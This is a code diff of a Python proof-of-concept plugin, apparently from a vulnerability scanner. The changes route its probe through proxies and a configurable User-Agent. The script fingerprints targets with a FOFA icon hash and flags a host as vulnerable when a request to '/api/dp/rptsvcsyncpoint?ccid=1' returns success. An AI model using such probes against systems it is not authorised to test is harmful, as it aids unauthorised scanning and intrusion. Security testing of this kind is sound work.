@@ -3,6 +3,9 @@
 
 import requests
 
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
 requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
@@ -16,11 +19,11 @@ FOFA_RULE='icon_hash="-829652342"'
 def poc(target):
     result = {}
     headers={
-        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+        "User-Agent": ua
     }
 
     try:
-        r = requests.get(target+"/api/dp/rptsvcsyncpoint?ccid=1",headers=headers, verify=False,timeout=10)
+        r = requests.get(target+"/api/dp/rptsvcsyncpoint?ccid=1",headers=headers, verify=False,timeout=10,proxies=proxies)
         if r.status_code==200 and 'result":0,"reason":"success' in r.text:
             result['vurl'] = target + "/api/dp/rptsvcsyncpoint?ccid=1"
             result['poc'] = NAME
